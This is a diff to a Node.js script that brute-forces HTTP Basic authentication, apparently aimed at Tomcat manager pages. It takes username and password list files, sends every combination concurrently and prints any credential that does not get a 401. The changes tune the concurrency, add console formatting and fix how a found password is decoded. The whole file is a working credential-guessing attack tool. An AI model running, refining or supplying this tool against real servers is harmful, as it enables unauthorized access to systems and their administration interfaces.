@@ -3,13 +3,20 @@ var request = require('request');
 
 var counter = 0;
 var totalCount = 0;
-var maxThread = 64;
+var maxThread = 16;
 var nowThread = 0;
 var authorizationList = [];
 var startTime = (new Date()).getTime();
 var options = {
     url: null,
     headers: {}
+}
+var consoleLength = 80;
+
+var consoleLog = function(str, newLine) {
+    var ss = [];
+    ss[consoleLength - str.length] = '';
+    process.stdout.write(str + ss.join(' ') + (newLine ? '\r\n' : '\033[0G'));
 }
 
 var readFile = function(fp, cb) {
@@ -21,32 +28,32 @@ var readFile = function(fp, cb) {
 var threadFunc = function(Authorization) {
     options.headers.Authorization = Authorization;
     request.get(options, function(err, data) {
-        // process.stdout.write('.');
         if (data.statusCode != 401) {
-            console.log('Got one:', data.statusCode, new Buffer('MTIzOjEyMzQ1Ng==', 'base64').toString());
+            consoleLog(['Good luck: {', data.statusCode, '} ', new Buffer(Authorization.split(' ')[1], 'base64').toString()].join(''), true);
         }
         if (--totalCount === 0) {
-            console.log('Total Seconds:', ((new Date()).getTime() - startTime) / 1000);
+            consoleLog('------', true);
+            consoleLog(['Total Seconds:', ((new Date()).getTime() - startTime) / 1000].join(''), true);
         }
         --nowThread;
     });
 }
 
-var callThreadFunc = function(){
+var callThreadFunc = function() {
     if (nowThread >= maxThread) {
         return setTimeout(callThreadFunc, 8);
     }
     ++nowThread;
     var Authorization = authorizationList.pop();
-    if(Authorization !== undefined){
+    if (Authorization !== undefined) {
         threadFunc(Authorization);
         callThreadFunc();
     }
 }
 
-var lastCount = function(){
-    if(totalCount > 0){
-        console.log('Speed:', counter - totalCount, 'L/S; ', 'Left:', totalCount);
+var lastCount = function() {
+    if (totalCount > 0) {
+        consoleLog(['Speed: ', counter - totalCount, 'L/S; ', 'Left: ', totalCount].join(''))
         counter = totalCount;
         setTimeout(lastCount, 1000);
     }
@@ -57,7 +64,7 @@ var main = function() {
     var usnameFile = process.argv[3];
     var passwdFile = process.argv[4];
     if (!options.url || !usnameFile || !passwdFile) {
-        console.log('Usage: node this.js http://192.168.133.133:8080/manager/html usname.txt passwd.txt');
+        consoleLog('Usage: node this.js http://192.168.133.133:8080/manager/html usname.txt passwd.txt', true);
         return 1;
     }
     readFile(usnameFile, function(uData) {
@@ -67,13 +74,14 @@ var main = function() {
             uData = pData = null;
             counter = totalCount = unameList.length * upassList.length;
             if (totalCount < 1) {
-                console.log('File of usname or passwd is empty.');
+                consoleLog('File of usname or passwd is empty.', true);
                 return 1;
             } else {
-                console.log('Total Count:', totalCount);
+                consoleLog(['Total Count:', totalCount].join(''), true);
+                consoleLog('------', true);
             }
-            unameList.forEach(function(u,m) {
-                upassList.forEach(function(p,n) {
+            unameList.forEach(function(u, m) {
+                upassList.forEach(function(p, n) {
                     authorizationList.push('Basic ' + new Buffer(u + ':' + p).toString('base64'));
                 });
             });
@@ -82,6 +90,4 @@ var main = function() {
         });
     });
 }
-
 main();
-
